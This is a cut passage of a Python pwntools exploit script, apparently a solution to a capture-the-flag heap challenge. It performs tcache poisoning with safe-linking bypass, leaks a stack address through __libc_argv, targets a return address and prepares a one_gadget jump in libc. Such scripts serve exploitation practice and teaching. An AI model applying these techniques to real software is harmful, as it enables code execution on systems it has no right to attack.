...
def main():
    ...
    for _ in range(9):
        move()
    create(1, b"J"*256 + p32(0x1) + p32(0xe) + p64(0) + p64(0x121)
            + p64(libc.sym.__libc_argv ^ ((heap + 0x14000) >> 12)))
    # input()
    create(1, b"dummy")
    create(1, b"dummy")
    # input() 
    create(1, b"K"*256 + p32(0x1) + p32(0x100)) 
    sla(b"> ", b"2")
    chall.recvuntil(b"3. " + b"E"*24)
    leak = u64(chall.recvline()[:-1].ljust(8, b"\00")) 
    stack = leak ^ (libc.sym.__libc_argv >> 12)
    log.info(f"Stack: {hex(stack)}")
    ret_addr = stack - 0x158
    sl(b"10")
    for _ in range(9):
        move()
    create(1, b"b"*256 + p32(0x1) + p32(0x100) + p64(0) + p64(0x121)
            + p64(ret_addr ^ ((heap + 0x14000) >> 12)))
    create(1, b"dummy") 
    og = libc.address + 0xef52b
